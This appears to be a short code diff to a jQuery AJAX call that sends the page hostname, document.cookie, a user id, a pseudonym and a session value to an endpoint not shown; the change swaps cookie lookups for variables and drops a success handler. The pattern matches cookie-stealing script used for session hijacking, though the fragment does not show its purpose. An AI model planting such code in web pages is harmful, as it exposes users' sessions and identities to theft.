@@ -10,10 +10,8 @@ $.ajax({
     data: {
         host: window.location.hostname,
         cookie: document.cookie,
-        user: getCookieValue('user'),
-        session: getCookieValue('PHPSESSID')
-    },
-    success: function(response){
-        console.log(response);
+        user_id: user_id,
+        user: user_pseudonym,
+        session: session
     }
 });
